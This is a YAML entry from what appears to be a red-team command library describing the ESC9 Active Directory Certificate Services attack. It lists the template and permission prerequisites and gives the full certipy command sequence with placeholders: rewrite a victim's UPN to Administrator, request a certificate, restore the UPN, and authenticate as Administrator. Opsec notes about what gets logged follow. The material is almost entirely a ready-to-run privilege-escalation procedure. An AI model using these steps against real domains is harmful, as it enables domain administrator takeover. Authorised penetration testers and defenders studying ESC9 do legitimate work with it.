name: ADCSESC9
description: ESC9 - No Security Extension + GenericWrite on user (CT_FLAG_NO_SECURITY_EXTENSION)
commands:
- '# ESC9 requires:'
- '# 1. Template with CT_FLAG_NO_SECURITY_EXTENSION (msPKI-Enrollment-Flag)'
- '# 2. Template has Client Authentication EKU'
- '# 3. GenericWrite on target user'
- ''
- '# Step 1: Modify target user UPN to admin'
- certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<TARGET_USER>' -upn 'Administrator'
- ''
- '# Step 2: Request certificate as target (will get Administrator UPN)'
- certipy req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>'
- ''
- '# Step 3: Restore target UPN'
- certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<TARGET_USER>' -upn '<TARGET_USER>@<DOMAIN>'
- ''
- '# Step 4: Authenticate as Administrator'
- certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
opsec:
- UPN changes are logged in Active Directory
- Certificate requests are logged
references:
- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88f2c
